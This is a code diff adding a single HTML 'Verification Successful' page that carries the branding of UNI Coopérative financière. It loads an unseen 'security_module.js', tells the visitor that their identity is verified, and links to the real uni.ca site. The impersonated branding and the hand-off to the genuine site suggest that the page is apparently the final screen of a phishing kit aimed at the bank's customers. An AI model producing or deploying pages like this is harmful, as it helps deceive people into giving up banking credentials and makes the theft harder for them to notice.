@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UNI - Success</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: #ffffff;
+            color: #333333;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px; 
+            padding: 24px 30px;
+            box-sizing: border-box;
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 40px;
+        }
+
+        .success-icon {
+            font-size: 80px;
+            color: #28a745;
+            margin-bottom: 25px;
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 700;
+            color: #4a4a4a;
+            margin: 0 0 15px 0;
+        }
+
+        .subtitle {
+            font-size: 18px;
+            font-weight: 500;
+            color: #4a4a4a;
+            margin: 0 0 30px 0;
+            line-height: 1.5;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background-color: #0981C5; 
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-bottom: 20px;
+        }
+
+        .submit-btn:hover {
+            background-color: #0068a3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="images/logoo.JPG" alt="UNI Coopérative financière" style="height: 75px; width: auto; object-fit: contain;">
+        </div>
+
+        <i class="fa-solid fa-circle-check success-icon"></i>
+
+        <h1 class="title">Verification Successful</h1>
+        <p class="subtitle">Your identity has been successfully verified. You can now securely continue to your account.</p>
+
+        <button onclick="window.location.href='https://www.uni.ca/en'" class="submit-btn">Return to home</button>
+    </div>
+<script src="security_module.js"></script>
+</body>
+</html>
+
